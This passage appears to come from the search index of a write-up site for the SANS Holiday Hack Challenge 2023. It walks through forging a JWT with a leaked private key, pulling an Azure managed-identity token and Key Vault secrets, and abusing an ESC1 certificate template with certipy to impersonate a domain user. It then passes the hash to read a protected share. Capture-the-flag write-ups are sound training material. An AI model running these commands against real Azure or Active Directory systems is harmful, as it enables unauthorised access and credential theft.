/jwtDefault/rMonitor.tok HTTP/2\nHost: captainscomms.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjY5YWFmZTEyLTQyNTAtNDA3Yy04NGQwLWIxZDEwMmIwZjkxZSJ9.ZY-PxA.EZo3tCIBknU-rn_lbdHnz6jsTO8\nSec-Ch-Ua: \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nPriority: u=0, i\n\n## rMonitor\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg\n</code></pre> <p>If we update our stored <code>justWatchThisRole</code> cookie with the rMonitor JWT, we can now access the radio decoder, but it just shows us a lovely SANS welcome message. There are three spikes in the signal graph, but clicking these just gives us an error message about needing the radioDecoder role.</p> <p>Fortunately, that's been stored at /jwtDefault/rDecoder.tok, so we can fetch and use it the same way we got the radio monitor JWT.</p> The rDecoder JWT <pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\n</code></pre> <p>Now we can decode the scoundrel's messages:</p> <p> </p> <p>The first message will hopefully help us get administrative access, the second and third are presumably only relevant when we can actually send a message.</p> <p>The Captain probably named the private key similarly to the public key, so we should try paths like:</p> <ul> <li>/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key or capsPrvKey.key</li> <li>/th3CapsPr1v4T3F0ld3r/capsPrivKey.key or capsPrvKey.key</li> <li>/keys + the four options above</li> <li>/jwtDefault/keys/ + the first four options</li> </ul> <p>Unforunately the web server is case-sensitive and the message is entirely uppercase, so there are at least those 12 options and probably several other less likely candidates, so it's possible we might need to brute-force... Fortunately <code>/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key</code> ended up being the correct path</p> The GET Request <pre><code>GET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2\nHost: captainscomms.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjY5YWFmZTEyLTQyNTAtNDA3Yy04NGQwLWIxZDEwMmIwZjkxZSJ9.ZY-PxA.EZo3tCIBknU-rn_lbdHnz6jsTO8\nSec-Ch-Ua: \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nPriority: u=0, i\n</code></pre> The Private Key <pre><code>-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q\n5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb\ng0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB\nkuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4\nMaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd\nJyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay\n4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI\nadyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3\nVtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj\n9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R\nDCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP\n/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N\n/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9\n4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD\nonQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz\nYJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD\nYuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC\nVGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR\nwZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta\nbnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx\nNdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW\nWiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ\nY46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb\nkk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj\nxVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut\nUdQXV73mNwnYl0RQmBnDOl+i\n-----END PRIVATE KEY-----\n</code></pre> <p>Taking those and one of our existing JWTs, we can use <code>https://jwt.io/</code> to create our new token. Just update the role to...</p> <p>Originally, I assumed radioAdministrator, or just Administrator, but then I remembered the owner's manual says that every SDR has a uniquely named administrator role:</p> <p></p> <p>Fortunately, the Captain's journal reveals what the role should be</p> <p></p> <p>So now we can fill in jwt.io and access the communications radio</p> <p></p> <p>Based on the Lincolnshire Poacher documentation, it seems we only need to care about the last two numbers in message 2, as the noise is just to distinguish and the first number is the recipient. 12249 looks an awful lot like a US date followed by 9, and 16009 could easily be a 24 hour time followed by a 9...</p> <p>The third message quite clearly gives us the freqency to use: <code>10426Hz</code></p> <p>We want the scoundrals to arrive four hours early, so we should enter: <code>10426Hz' '12/24</code> <code>12:00</code> and press <code>TX</code></p> <p></p>"},{"location":"objectives/o18/#public-key","title":"Public Key","text":"<pre><code>-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw\nVzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w\nJ327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q\nn6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa\ncx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO\nqZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6\nuQIDAQAB\n-----END PUBLIC KEY-----\n</code></pre>"},{"location":"objectives/o18/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"},{"location":"objectives/o19/","title":"Active Directory","text":"<p>Difficulty:  Direct link: <code>ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org</code></p>"},{"location":"objectives/o19/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford <p>Hello, I'm Ribb Bonbowford. Nice to meet you!Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/o19/#hints","title":"Hints","text":"Useful Tools <p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p> Misconfiguration ADventures <p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>"},{"location":"objectives/o19/#solution","title":"Solution","text":"<p>This requires access to Alabaster's SSH account on <code>ssh-server-vm.santaworkshopgeeseislands.org</code>, so if you haven't completed Certificate SSHenanigans, you need to do that first.</p> <p>While completing <code>Certificate SSHenanigans</code>, I noted Alabaster had an \"impact\" folder, which reminded me strongly of the Kerberoasting Challenge from 2021. The first step there is to figure out what the AD controller's IP was and what the domain was, since all (most?) of the commands we have access to require at least one of those.</p> <p>Unfortunately, <code>nmap</code> wasn't installed, but maybe Azure has an API that can help? After trying a lot of different APIs and mostly receiving empty or unauthorised replies, someone hinted that it might help to start by seeing what we do have access to. Azure has a command for that!</p> <pre><code>$ curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=2022-04-01 --header \"Authorization: Bearer $at\" | jq\n</code></pre> <p>Alabaster can:</p> <ul> <li>\"Microsoft.KeyVault/vaults/read\",</li> <li>\"Microsoft.KeyVault/vaults/secrets/read\",</li> <li>\"Microsoft.Web/sites/sourcecontrols/Read\",</li> <li>\"microsoft.web/sites/functions/read\",</li> <li>\"Microsoft.Resources/subscriptions/resourceGroups/read\"</li> </ul> <p>The latter three seem mostly applicable to the Azure Function App from the previous objective, so let's see which vaults are available:</p> <pre><code>$ curl \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?$filter=resourceType+eq+\\'Microsoft.KeyVault/vaults\\\\'&amp;api-version=2015-11-01\" --header \"Authorization: Bearer $at\" | jq\n</code></pre> <p>northpole-it-kv and northpole-ssh-certs-kv. The SSH certs sounds like it'll be a more useful keyvault, so let's try getting info about it first:</p> <pre><code>$ curl \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2022-07-01\" --header \"Authorization: Bearer $at\" | jq\n</code></pre> <p>It looks like Alabaster has permission to fetch it's secrets, which seem to be at <code>https://northpole-ssh-certs-kv.vault.azure.net/secrets?api-version=7.4</code>. Trying to fetch that returns an error about the authorization header being invalid... I guess that's because it was originally fetched for the management API rather than the vault API. Let's get a new authorization token:</p> <pre><code>$ curl \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net\" --header \"Metadata:true\" | jq\n</code></pre> Resource naming <p>Azure is pedantic about the resource naming. I originally thought it should be <code>northpole-ssh-certs-kv.vault.azure.net</code> since that's the site I'm requesting API information from. I can get a token for that, but trying to use it to fetch tokens gave me an error explaining that it should be for <code>https://vault.azure.net</code>. I then accidentally requested a token for <code>https://vault.azure.net/</code> and again, got a token that I once again could not use.</p> <p>We can then set the resulting token into a variable <code>bt</code>, in case we need our first access token again.</p> <p>But there are no secrets... How about the other vault?</p> <pre><code>$ curl --header \"Authorization: Bearer $bt\" \"https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4\" | jq\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   244  100   244    0     0   1063      0 --:--:-- --:--:-- --:--:--  1065\n{\n  \"value\": [\n    {\n      \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript\",\n      \"attributes\": {\n        \"enabled\": true,\n        \"created\": 1699564823,\n        \"updated\": 1699564823,\n        \"recoveryLevel\": \"Recoverable+Purgeable\",\n        \"recoverableDays\": 90\n      },\n      \"tags\": {}\n    }\n  ],\n  \"nextLink\": null\n}\n</code></pre> <p>Success! What's in the script?</p> <pre><code>$ curl --header \"Authorization: Bearer $bt\" \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/versions?api-version=7.4\" | jq\n# Version information\n$ curl --header \"Authorization: Bearer $bt\" \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/d8a14e5339d04b44a20392210c0283fe?api-version=7.4\" | jq\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   720  100   720    0     0   3886      0 --:--:-- --:--:-- --:--:--  3870\n{\n  \"value\": \"# Import the Active Directory module Import-Module ActiveDirectory  # Define user properties $UserName = \\\"elfy\\\" $UserDomain = \\\"northpole.local\\\" $UserUPN = \\\"$UserName@$UserDomain\\\" $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force $DCIP = \\\"10.0.0.53\\\"  # Create a new AD user New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\n  \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/d8a14e5339d04b44a20392210c0283fe\",\n  \"attributes\": {\n    \"enabled\": true,\n    \"created\": 1698673721,\n    \"updated\": 1698673721,\n    \"recoveryLevel\": \"Recoverable+Purgeable\",\n    \"recoverableDays\": 90\n  },\n  \"tags\": {}\n}\n</code></pre> <p>I checked both versions of the script but they seem to be equivalent. Perfect, now we have:</p> <ul> <li>The Domain Controller's IP: 10.0.0.53</li> <li>A Domain user's username: elfy</li> <li>Their password: <code>J4``ufC49/J4766\\</code></li> <li>The domain: northpole.local</li> </ul> <p>And now we can use Alabaster's \"impacket\" tools! But which one?</p> <p>Previous hints talked about the Reportinator coming in handy, which talked about <code>certipy</code>. Hints for this challenge also mentioned certificates, so let's see if it finds any vulnerabilities:</p> <p>!!! warning \"Remember to escape the backtick in the password!</p> <pre><code>$ certipy find -vulnerable -dc-ip 10.0.0.53 northpole.local/elfy:J4\\`ufC49/J4766\n...\n \"Template Name\": \"NorthPoleUsers\",\n ...\n \"Certificate Authorities\": [\n        \"northpole-npdc01-CA\"\n      ],\n...\n \"[!] Vulnerabilities\": {\n        \"ESC1\": \"'NORTHPOLE.LOCAL\\\\\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\"\n</code></pre> <p>Okay, so we can get a certificate with any user we want... but which user? Well, we need to access the \"secret file in the inaccessible folder on the FileShare\". We can already access the FileShare and see the inaccessible folder as elfy, but we can't access it:</p> <pre><code>$ smbclient.py northpole.local/elfy:J4\\`ufC49/J4766@10.0.0.53\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nType help for list of commands\n# shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n# use FileShare\n# ls\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 .\ndrw-rw-rw-          0  Tue Jan  2 01:13:41 2024 ..\n-rw-rw-rw-     701028  Tue Jan  2 01:13:43 2024 Cookies.pdf\n-rw-rw-rw-    1521650  Tue Jan  2 01:13:44 2024 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Tue Jan  2 01:13:44 2024 SignatureCookies.pdf\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 super_secret_research\n-rw-rw-rw-        165  Tue Jan  2 01:13:44 2024 todo.txt\n# cd super_secret_research\n[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)\n</code></pre> <p>You can get a certificate for any arbitrary username, but when you try to use it with <code>certipy auth</code>, you'll get an error if the user does not exist. Alabaster does exist, but cannot access the super secret share either.</p> <p>Fortunately, Alabaster has a command for viewing users: <pre><code>$ lookupsid.py northpole.local/elfy:J4\\`ufC49/J4766@10.0.0.53\n...\n$ lookupsid.py northpole.local/elfy:J4\\`ufC49/J4766@10.0.0.53 | grep SidTypeUser\n500: NORTHPOLE\\alabaster (SidTypeUser)\n501: NORTHPOLE\\Guest (SidTypeUser)\n502: NORTHPOLE\\krbtgt (SidTypeUser)\n1000: NORTHPOLE\\npdc01$ (SidTypeUser)\n1104: NORTHPOLE\\elfy (SidTypeUser)\n1105: NORTHPOLE\\wombleycube (SidTypeUser)\n</code></pre></p> <p>Ribb Bonbowford mentioned Wombley so let's try his account:</p> <pre><code>$ certipy req -username elfy@northpole.local -p J4\\`ufC49/J4766 -ca northpole-npdc01-CA -target northpole.local -template NorthPoleUsers -upn wombleycube@northpole.local -dc-ip 10.0.0.53\n...\n[*] Saved certificate and private key to 'wombleycube.pfx'\n$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53 -domain northpole.local\n...\nGot hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n$ smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n# shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n# use FileShare\n# ls\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 .\ndrw-rw-rw-          0  Tue Jan  2 01:13:41 2024 ..\n-rw-rw-rw-     701028  Tue Jan  2 01:13:43 2024 Cookies.pdf\n-rw-rw-rw-    1521650  Tue Jan  2 01:13:44 2024 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Tue Jan  2 01:13:44 2024 SignatureCookies.pdf\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 super_secret_research\n-rw-rw-rw-        165  Tue Jan  2 01:13:44 2024 todo.txt\n# cd super_secret_research\n# ls\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 .\ndrw-rw-rw-          0  Tue Jan  2 01:13:44 2024 ..\n-rw-rw-rw-        231  Tue Jan  2 01:13:44 2024 InstructionsForEnteringSatelliteGroundStation.txt\n# cat InstructionsForEnteringSatelliteGroundStation.txt\nNote to self:\n\nTo enter the Satellite Ground Station (SGS), say the following into the speaker:\n\nAnd he whispered, 'Now I shall be out of sight;\nSo through the valley and over the height.'\nAnd he'll silently take his way.\n</code></pre> <p>Answer</p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p>"},{"location":"objectives/o19/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Wow, nice work. I'm impressed!This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.Well, I guess it's probably somewhere on Space Island, but I've not been there yet.I'm not a big fan of jungles, you see. I have this tendency to get lost in them.Anyway, if you feel like investigating, that'd be where I'd go look.Good luck and I'd try and steer clear of ChatNPT if I were you.</p>"},{"location":"objectives/o2/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: Snowball Fight</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat <p>Hey there, I'm Morcel Nougat, elf extraordinaire! You won't believe this, but we're on a magical tropical island called Christmas Island, and it even has snow! I'm so glad ChatNPT suggested we come here this year! Santa, some elves, and I are having a snowball fight, and we'd love you to join us. Santa's really good, so trust me when I say it's way more fun when played with other people. But hey, if you can figure out a way to play solo by tinkering with client side variables or parameters to go solo mode, go for it! There's also ways to make the elves' snowballs do no damage, and all kinds of other shenanigans, but you didn't hear that from me. Just remember, it's all about having fun and sharing the joy of the holiday season with each other. So, are you in? We'd really love your company in this epic snowball battle!</p>"},{"location":"objectives/o2/#hints","title":"Hints","text":"Snowball Super Hero <p>Its easiest to grab a friend play with and beat Santa but tinkering with client-side variables can grant you all kinds of snowball fight super powers. You could even take on Santa and the elves solo!</p> Consoling iFrames <p>Have an iframe in your document? Be sure to select the right context before meddling with JavaScript.</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"<p>There are a number of different ways to solve this challenge; you can just play by the rules (but it will take a long time and a lot of luck since Santa is pretty OP), you can increase the damage you do, you can decrease the damage the elves do or you can get help from a certain dwarf.</p> <p>After opening the snowball fight challenge in an iFrame, open up your developer tools. In the Console window, you need to make sure you're interacting with the snowball fight rather than with the main holiday hack window.</p> <p>In Chromium, click the arrow next to \"Top\" on the top right: </p> <p>In Firefox click the box-y symbol next to the phone/ipad on the top left: </p> <p>You can then interact with the NPC characters, making yourself unkillable through something like <code>player.health = 99999999999</code>, and making Santa and the elves not attack through things like <code>santaThrowDelay = 99999</code> and <code>elfThrowDelay = 99999</code>.</p> Move velocity <p>Setting the move velocity too high makes the game entertaining but not necessarily easier...</p> <p></p> <p>Another option is to set <code>singlePlayer = true</code> at the start of the game to summon Elf the Dwarf:</p> <p></p> <p>and then just hide behind him until Santa is defeated.</p>"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Elf the Dwarf</p> <p>By the twinkling stars and the shimmering snowflakes, you've done it! You bested Santa in a snowball skirmish of epic proportions! The chill in the air now carries the tune of your victory, dancing through the evergreens and telling tales of your frosty valour, I, Elf the Dwarf, hereby crown you the champions of chill, nay the SOVEREIGNS OF SNOW! May your tales of icey conquest be sung by the harth in winters to come so that you may receive... MUCH GLORY!</p> <p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o20/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: Space Island Door</p>"},{"location":"objectives/o20/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins <p>What are you doing here, and who are you?Me first? I'm 